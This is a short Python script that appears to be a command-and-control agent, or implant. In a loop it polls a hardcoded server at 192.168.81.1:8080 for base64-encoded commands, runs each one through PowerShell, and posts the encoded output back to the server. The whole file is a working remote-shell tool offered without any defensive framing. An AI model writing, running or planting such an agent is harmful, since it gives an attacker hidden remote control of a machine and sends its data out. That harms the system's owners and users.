#!/usr/bin/env python3

from urllib.request import urlopen, Request
from base64 import b64encode, b64decode
from subprocess import Popen, PIPE
from time import sleep
from sys import stdout
from dataclasses import dataclass
from typing import TextIO
from datetime import datetime

# Config
RHOST = "192.168.81.1"
RPORT = "8080"
URL = f"http://{RHOST}:{RPORT}/command"

# Helper    
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def popen(command=None, interpreter=None):
    # Args
    if not command: command = "whoami"
    if not interpreter: interpreter = "powershell"
    # Exec
    process = Popen([interpreter, "-c", command], stdout=PIPE, stderr=PIPE)
    # Response
    stdout, stderr = process.communicate()
    stdout = stdout.decode("utf-8")
    stderr = stderr.decode("utf-8")
    # Done
    return stdout, stderr

@dataclass
class Status:
    status:str = "---"
    stream:TextIO = stdout
    terminal_width=64

    def write(self, buffer:str, flush=False):
        self.stream.write(buffer)
        if flush: self.stream.flush()

    def clear(self, flush=False):
        self.write(f"\r{self.terminal_width*' '}\r", flush=flush)
    
    def write_status(self, status:str=None, flush=True):
        if status: self.status = status
        self.clear()
        self.write(self.status, flush=flush)
    
    def write_line(self, buffer:str, flush=False):
        self.clear()
        self.write(f"{buffer}\n")
        self.write_status()

    def update(self): self.write_status(flush=True)

STATUS = Status()
STATUS.update()


# Main
def check_command():
    response = urlopen(URL)
    command = response.read().decode("utf-8")
    command = from_base64(command)
    if command == "": return
    stdout, stderr = popen(command)
    stdout_encoded = to_base64(stdout, to_bytes=True)
    # Send
    request = Request(URL, data=stdout_encoded, method="POST")
    response = urlopen(request)
    # Done
    STATUS.write_status(f"[*] Updated at {datetime.now()}", flush=True)

def main():
    try:
        while True:
            check_command()
            sleep(3)
    except KeyboardInterrupt:
        pass
    

if __name__ == '__main__': main()